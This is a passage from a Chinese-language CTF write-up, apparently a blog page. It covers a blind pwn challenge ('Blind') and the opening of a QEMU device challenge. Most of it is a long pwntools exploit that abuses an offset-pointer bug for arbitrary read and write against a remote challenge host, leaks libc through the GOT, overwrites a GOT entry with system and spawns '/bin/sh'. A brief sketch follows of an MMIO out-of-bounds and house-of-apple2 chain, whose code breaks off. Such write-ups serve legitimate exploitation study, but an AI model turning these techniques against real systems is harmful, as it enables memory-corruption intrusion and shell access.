class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="blind">Blind</span><a href="#blind" class="header-anchor"></a></h3><p>盲Pwn，感觉得先找到栈溢出在哪边，然后试着泄露一下栈上的数据</p>
<p>试着输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7d40w</span><br><span class="line">回车</span><br></pre></td></tr></table></figure>

<p>能够泄露一些栈的基本数据，可以利用这一点寻找BROP</p>
<p>目前感觉，程序使用了一个结构体:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">   <span class="type">char</span>* bufferptr;</span><br><span class="line">&#125;BufferOffset</span><br></pre></td></tr></table></figure>

<p>这个程序在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aaaaaaa\x00&gt;</span><br></pre></td></tr></table></figure>

<p>前半部打印的时候，会使用这个结构体，而且这个结构体猜测它是这样放的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Aaaaaaa\x00][bufferptr]</span><br></pre></td></tr></table></figure>

<p>所以，当我们尝试使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d[num]s</span><br></pre></td></tr></table></figure>

<p>的时候，这个offset就会发生位移</p>
<p>经过测试，利用下面的位移就能够通过修改指针，实现任意地址泄露</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># success poc</span></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;7d&quot;</span>)</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;1w&quot;</span>)</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8w&quot;</span>) # 这里w表示+，s表示-，想要泄露哪个地址就用对应的偏移即可</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8a&quot;</span>)</span><br><span class="line">print(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;7s&quot;</span>)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p>然后根据上述的思路，可以先编写一个用于泄露的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_offset</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    res1 = []</span><br><span class="line">    res2 = []</span><br><span class="line">    <span class="keyword">if</span> num1 == <span class="number">0</span>:</span><br><span class="line">        res1 = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> num2 == <span class="number">0</span>:</span><br><span class="line">        res2 = [<span class="number">0</span>]</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> num1 &gt; <span class="number">0</span> <span class="keyword">and</span> num2 &gt; <span class="number">0</span>:</span><br><span class="line">        res1.append(num1 % <span class="number">256</span>)</span><br><span class="line">        num1 //= <span class="number">256</span></span><br><span class="line">        res2.append(num2 % <span class="number">256</span>)</span><br><span class="line">        num2 //= <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    ret_str = []</span><br><span class="line">    <span class="keyword">for</span> n1, n2 <span class="keyword">in</span> <span class="built_in">zip</span>(res1, res2):</span><br><span class="line">        ret_str.extend([<span class="built_in">str</span>(n1) + <span class="string">&#x27;s&#x27;</span>, <span class="built_in">str</span>(n2) + <span class="string">&#x27;w&#x27;</span>])</span><br><span class="line">        ret_str.append(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># skip last one</span></span><br><span class="line">    <span class="keyword">return</span> ret_str[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_steps</span>(<span class="params">ph, in_str</span>):</span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    ph.sendline(in_str)</span><br><span class="line">    <span class="comment"># content = ph.recvuntil(&quot;\n&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_content</span>(<span class="params">ph,str_base,test_address</span>):</span><br><span class="line">  </span><br><span class="line">    ret_content = <span class="string">&quot;&quot;</span></span><br><span class="line">    ph.sendline(<span class="string">&quot;8d&quot;</span>)</span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here, we will calculate the return address</span></span><br><span class="line">    send_str = calc_offset(str_base,test_address)</span><br><span class="line">    <span class="built_in">print</span>(send_str)</span><br><span class="line">    content = try_steps(ph,<span class="string">&#x27;&#x27;</span>.join(send_str))</span><br><span class="line">    log.debug(<span class="string">&quot;Here try to leak return address content&quot;</span>)</span><br><span class="line">    <span class="comment"># content = ph.recvuntil(&quot;\n&gt; &quot;)</span></span><br><span class="line">    content = ph.recvb(numb=<span class="number">1</span>)</span><br><span class="line">    content += ph.recvb(<span class="number">100</span>)</span><br><span class="line">    content += ph.recvb(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line">    ret_content = content[<span class="number">1</span>:<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># fd.flush()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move return</span></span><br><span class="line">    <span class="comment"># first, move back</span></span><br><span class="line">    offset = str_base - test_address</span><br><span class="line">    ph.sendline(<span class="built_in">str</span>(offset)+<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># then, change it one by one</span></span><br><span class="line">    send_str.reverse()</span><br><span class="line">    rev_send_str = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> send_str:</span><br><span class="line">        <span class="keyword">if</span> each == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            rev_send_str.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> each:</span><br><span class="line">            rev_send_str.append(each.replace(<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;s&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> each:</span><br><span class="line">            rev_send_str.append(each.replace(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;w&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(rev_send_str)</span><br><span class="line">    ph.sendline(<span class="string">&#x27;&#x27;</span>.join(rev_send_str))</span><br><span class="line">    <span class="comment"># content = try_steps(ph,&quot;16s&quot;)</span></span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ph.sendline(<span class="built_in">str</span>(offset)+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;8a&quot;</span>)</span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ph = remote(<span class="string">&quot;120.46.65.156&quot;</span>,<span class="number">32104</span>)</span><br><span class="line">banner = ph.recvuntil(<span class="string">&quot;submit.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># success poc</span></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;7d1w&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line">content = try_steps(ph,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8w&quot;</span>)</span><br><span class="line">log.debug(<span class="string">&quot;Here try to leak address&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"><span class="comment"># don&#x27;t know why not align....</span></span><br><span class="line">str_base = u64(content[<span class="number">1</span>:<span class="number">9</span>]) - <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ph.sendline(in_str)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ste_base leak address is 0x%x&quot;</span>%str_base)</span><br><span class="line"><span class="comment"># return origin</span></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8a&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8s&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">content = try_steps(ph,<span class="string">&quot;8d16w&quot;</span>)</span><br><span class="line">log.debug(<span class="string">&quot;Here try to leak return address&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"><span class="comment"># don&#x27;t know why not align....</span></span><br><span class="line">ret_address = u64(content[<span class="number">1</span>:<span class="number">9</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret_address leak address is 0x%x&quot;</span>%ret_address)</span><br><span class="line"></span><br><span class="line">ph.sendline(<span class="string">&quot;16a&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">ph.sendline(<span class="string">&quot;16s&quot;</span>)</span><br><span class="line"><span class="comment"># content = try_steps(ph,&quot;16s&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"><span class="built_in">print</span>(ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># content = try_steps(ph,&quot;8a&quot;)</span></span><br><span class="line">ph.sendline(<span class="string">&quot;8d&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;Here, try to leak..................&quot;)</span></span><br><span class="line"></span><br><span class="line">start_address = ret_address&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">start_address -= <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">test_address = start_address + <span class="number">0x6a0</span></span><br><span class="line">end_address = start_address + <span class="number">0x5000</span></span><br><span class="line"></span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;dump&quot;</span>,<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> test_address &lt; end_address:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++++++++] address 0x%x ,offset0x%x[++++++++++++++++]&quot;</span>%(test_address, test_address - start_address))</span><br><span class="line">    ph.sendline(<span class="string">&quot;8d&quot;</span>)</span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here, we will calculate the return address</span></span><br><span class="line">    send_str = calc_offset(str_base,test_address)</span><br><span class="line">    <span class="built_in">print</span>(send_str)</span><br><span class="line">    content = try_steps(ph,<span class="string">&#x27;&#x27;</span>.join(send_str))</span><br><span class="line">    log.debug(<span class="string">&quot;Here try to leak return address content&quot;</span>)</span><br><span class="line">    <span class="comment"># content = ph.recvuntil(&quot;\n&gt; &quot;)</span></span><br><span class="line">    content = ph.recvb(numb=<span class="number">1</span>)</span><br><span class="line">    content += ph.recvb(<span class="number">100</span>)</span><br><span class="line">    content += ph.recvb(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line">    fd.write(content[<span class="number">1</span>:<span class="number">9</span>])</span><br><span class="line">    fd.flush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># move return</span></span><br><span class="line">    <span class="comment"># first, move back</span></span><br><span class="line">    offset = str_base - test_address</span><br><span class="line">    ph.sendline(<span class="built_in">str</span>(offset)+<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># then, change it one by one</span></span><br><span class="line">    send_str.reverse()</span><br><span class="line">    rev_send_str = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> send_str:</span><br><span class="line">        <span class="keyword">if</span> each == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            rev_send_str.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> each:</span><br><span class="line">            rev_send_str.append(each.replace(<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;s&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> each:</span><br><span class="line">            rev_send_str.append(each.replace(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;w&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(rev_send_str)</span><br><span class="line">    ph.sendline(<span class="string">&#x27;&#x27;</span>.join(rev_send_str))</span><br><span class="line">    <span class="comment"># content = try_steps(ph,&quot;16s&quot;)</span></span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    ph.recvuntil(<span class="string">&quot;\n&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ph.sendline(<span class="built_in">str</span>(offset)+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;8a&quot;</span>)</span><br><span class="line">    content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    test_address += <span class="number">8</span></span><br><span class="line"></span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>

<p>完成leak操作之后，虽然binary不太能看，但是勉强已经能做了。感觉之前有些分析的逻辑有点不对，不过就顺势做下去就好了。利用前面的偏移操作实现任意地址写，然后泄露libc，完成ret2libc即可。</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MzVjODNlNGY4MDliNjYxMjhhOGYxY2JjZjM1ZDc1YjNfM2FwVHVnT2xiMldTN2lMRzM1a2ZJQXBxa0lkQ29SYnNfVG9rZW46UXM1bGJ4YWdMb0Yyd1R4WURlcGNBNmtrblRkXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>最后稍微提一个小坑：因为这个最后&#x2F;bin&#x2F;sh字符串执行的时候，存在s，会导致偏移发生错乱，所以这里需要再修改指针最后加一个移动（做到这一步的人应该能理解我在说什么）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">setbuf_got  = <span class="number">0x4038</span> + start_address</span><br><span class="line">printf_got = <span class="number">0x4040</span> + start_address</span><br><span class="line">printf_plt = <span class="number">0x56CF0</span></span><br><span class="line"></span><br><span class="line">test_address = printf_got</span><br><span class="line">printf_real = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++++++++] address 0x%x ,offset0x%x[++++++++++++++++]&quot;</span>%(test_address, test_address - start_address))</span><br><span class="line">printf_real = leak_content(ph, str_base, printf_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LEAKING INFO&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(printf_real)</span><br><span class="line">printf_real = u64(printf_real)</span><br><span class="line">libc_base = printf_real - printf_plt</span><br><span class="line">real_system = <span class="number">0x48e50</span> + libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test libc_base base address is 0x%x&quot;</span>%libc_base)</span><br><span class="line"><span class="comment"># print(&quot;Test real_system base address is 0x%x&quot;%real_system)</span></span><br><span class="line"><span class="comment"># # print(&quot;test libc address&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># header = leak_content(ph, str_base, real_system)</span></span><br><span class="line"><span class="comment"># header += leak_content(ph, str_base, real_system+8)</span></span><br><span class="line"><span class="comment"># header += leak_content(ph, str_base, real_system+0x10)</span></span><br><span class="line"><span class="comment"># header += leak_content(ph, str_base, real_system+0x18)</span></span><br><span class="line"><span class="comment"># print(header)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[++++++++++++++++] modify target adata&quot;</span>)</span><br><span class="line"><span class="comment"># modify this got</span></span><br><span class="line">test_address = <span class="number">0x4018</span>+start_address</span><br><span class="line">ret_content = <span class="string">&quot;&quot;</span></span><br><span class="line">ph.sendline(<span class="string">&quot;8d&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># here, we will calculate the return address</span></span><br><span class="line">send_str = calc_offset(str_base,test_address)</span><br><span class="line"><span class="built_in">print</span>(send_str)</span><br><span class="line">content = try_steps(ph,<span class="string">&#x27;&#x27;</span>.join(send_str))</span><br><span class="line">log.debug(<span class="string">&quot;Here try to attack !!&quot;</span>)</span><br><span class="line"><span class="comment"># content = ph.recvuntil(&quot;\n&gt; &quot;)</span></span><br><span class="line">content = ph.recvb(numb=<span class="number">1</span>)</span><br><span class="line">content += ph.recvb(<span class="number">100</span>)</span><br><span class="line">content += ph.recvb(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line">origin_data = content[<span class="number">1</span>:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">ph.sendline(<span class="string">&quot;13a&quot;</span>)</span><br><span class="line">content = ph.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify the offset</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># here, try to modify it</span></span><br><span class="line"><span class="comment"># data must be array</span></span><br><span class="line">data = p64(real_system)</span><br><span class="line"><span class="comment"># if type(data) != list:</span></span><br><span class="line"><span class="comment">#     exit(0)</span></span><br><span class="line"><span class="comment"># ph.interactive()</span></span><br><span class="line">modify_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i,each <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">    modify_str = modify_str + <span class="built_in">str</span>(origin_data[i]) + <span class="string">&quot;s&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(each)) + <span class="string">&quot;w&quot;</span></span><br><span class="line">    modify_str += <span class="string">&quot;d&quot;</span></span><br><span class="line">modify_str = modify_str[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># finish attach</span></span><br><span class="line">modify_str += <span class="string">&quot;;/bin/sh&quot;</span></span><br><span class="line"><span class="built_in">print</span>(modify_str)</span><br><span class="line">ph.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="qemuplayground-2">qemuplayground-2</span><a href="#qemuplayground-2" class="header-anchor"></a></h3><p>mmio越界覆盖4字节的指针，相对地址大范围读写，可以泄露堆上的unsortbin指针然后找到本线程的arena，再通过多次解引用找到main_arena，泄露libc地址，最后打house of apple2的链子运行system(“cat flag 1&gt;&amp;2”)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 